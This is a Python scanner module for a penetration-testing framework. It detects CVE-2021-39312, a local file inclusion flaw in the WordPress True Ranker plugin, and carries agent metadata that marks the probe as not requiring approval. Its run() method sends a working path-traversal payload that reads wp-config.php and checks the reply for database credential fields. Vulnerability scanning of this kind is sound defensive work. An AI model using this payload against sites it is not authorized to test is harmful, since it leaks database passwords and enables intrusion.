#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress True Ranker before version 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress True Ranker <2.2.4 - Local File Inclusion Detection',
        'description': 'WordPress True Ranker before version 2.2.4 allows sensitive configuration files such as wp-config.php, to be accessed via the src parameter found in the ~/admin/vendor/datatables/examples/resources/examples.php file via local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'unauth', 'lfr', 'wpscan', 'wp-plugin', 'lfi', 'wp', 'wordpress', 'trueranker', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d48e723c-e3d1-411e-ab8e-629fe1606c79',
            'https://www.wordfence.com/vulnerability-advisories/#CVE-2021-39312',
            'https://plugins.trac.wordpress.org/browser/seo-local-rank/tags/2.2.2/admin/vendor/datatables/examples/resources/examples.php',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-39312',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-39312',
    }

    def run(self):
        path = '/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}, data='src=%2Fscripts%2Fsimple.php%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='WordPress True Ranker <2.2.4 - Local File Inclusion detected', path=path)
            return True
        return False

